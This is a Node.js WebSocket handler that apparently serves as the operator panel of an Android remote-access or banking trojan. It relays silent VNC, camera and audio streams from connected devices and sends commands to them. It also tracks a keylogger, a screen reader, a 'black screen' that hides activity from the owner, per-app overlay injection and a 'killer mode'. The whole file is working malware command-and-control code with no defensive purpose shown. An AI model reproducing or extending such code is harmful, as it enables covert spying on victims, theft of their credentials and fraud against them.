'use strict';
const { q, setField } = require('../db');
const state            = require('../state');
const AUTH_TOKEN       = process.env.AUTH_TOKEN || '';

function handle(ws, req) {
  if (AUTH_TOKEN) {
    const tok = new URL(req.url, 'http://h').searchParams.get('token') || '';
    if (tok !== AUTH_TOKEN) {
      ws.send(JSON.stringify({ type: 'auth_error', message: 'Invalid token' }));
      ws.close(4401, 'Unauthorized');
      return;
    }
  }

  state.dashboards.add(ws);
  console.log(`[DASH+] total=${state.dashboards.size}`);
  _sendInitialState(ws);

  ws.on('message', (data) => {
    let msg; try { msg = JSON.parse(data.toString()); } catch (_) { return; }
    _handleMsg(ws, msg);
  });

  ws.on('close', () => {
    state.dashboards.delete(ws);
    state.removeFromAllSubs(ws);
    console.log(`[DASH-] total=${state.dashboards.size}`);
  });

  ws.on('error', err => console.error('[DASH!]', err.message));
}

function _sendInitialState(ws) {
  const send = obj => { try { ws.send(JSON.stringify(obj)); } catch(_) {} };
  send({ type: 'device_list', devices: q.getAll.all(), ts: Date.now() });
  send({ type: 'online_set', device_ids: [...state.devices.keys()], ts: Date.now() });
  send({ type: 'stats', data: q.getStats.get(), ts: Date.now() });
}

function _handleMsg(ws, msg) {
  const now = Date.now();
  switch (msg.type) {

    case 'ping':
      ws.send(JSON.stringify({ type: 'pong', ts: now }));
      break;

    case 'subscribe_vnc':
      state.getOrCreate(state.vncSubs, msg.device_id).add(ws);
      ws.send(JSON.stringify({ type: 'subscribed', stream: 'vnc', device_id: msg.device_id }));
      break;

    case 'unsubscribe_vnc':
      state.vncSubs.get(msg.device_id)?.delete(ws);
      break;

    case 'subscribe_camera':
      state.getOrCreate(state.cameraSubs, msg.device_id).add(ws);
      break;

    case 'unsubscribe_camera':
      state.cameraSubs.get(msg.device_id)?.delete(ws);
      break;

    case 'subscribe_audio':
      state.getOrCreate(state.audioSubs, msg.device_id).add(ws);
      break;

    case 'unsubscribe_audio':
      state.audioSubs.get(msg.device_id)?.delete(ws);
      break;

    case 'command': {
      const { device_id, action, ...params } = msg;
      if (!device_id || !action) return;
      const sent = state.sendToDevice(device_id, { action, ...params });
      q.insertCmd.run(device_id, action, JSON.stringify(params), sent ? 1 : 0, now);
      _optimisticUpdate(device_id, action, params);
      ws.send(JSON.stringify({ type: 'command_ack', device_id, action, sent, ts: now }));
      state.broadcastAll({ type: 'command_issued', device_id, action, params, sent, ts: now });
      break;
    }

    case 'set_inject': {
      const { device_id, package_name, enabled } = msg;
      if (!device_id || !package_name) return;
      q.setInject.run(enabled ? 1 : 0, device_id, package_name);
      state.broadcastAll({ type: 'inject_status', device_id, package_name, enabled, ts: now });
      break;
    }
  }
}

function _optimisticUpdate(deviceId, action, params) {
  try {
    switch (action) {
      case 'TOGGLE_CAMERA':        setField('camera_active',        deviceId, params.enabled?1:0); break;
      case 'TOGGLE_MICROPHONE':    setField('mic_active',           deviceId, params.enabled?1:0); break;
      case 'TOGGLE_KEYLOGGER':     setField('keylogger_active',     deviceId, params.enabled?1:0); break;
      case 'TOGGLE_SCREEN_READER': setField('screen_reader_active', deviceId, params.enabled?1:0); break;
      case 'BLACK_SCREEN_ON':      setField('black_screen_active',  deviceId, 1); break;
      case 'BLACK_SCREEN_OFF':     setField('black_screen_active',  deviceId, 0); break;
      case 'TOGGLE_BLACK_SCREEN':  setField('black_screen_active',  deviceId, params.enabled?1:0); break;
      case 'TOGGLE_KILLER_MODE':   setField('killer_mode',          deviceId, params.enabled?1:0); break;
      case 'START_SILENT_VNC':     setField('vnc_active',           deviceId, 1); break;
      case 'STOP_SILENT_VNC':      setField('vnc_active',           deviceId, 0); break;
    }
  } catch(e) { /* non-fatal — device row might not exist yet */ }
}

module.exports = { handle };
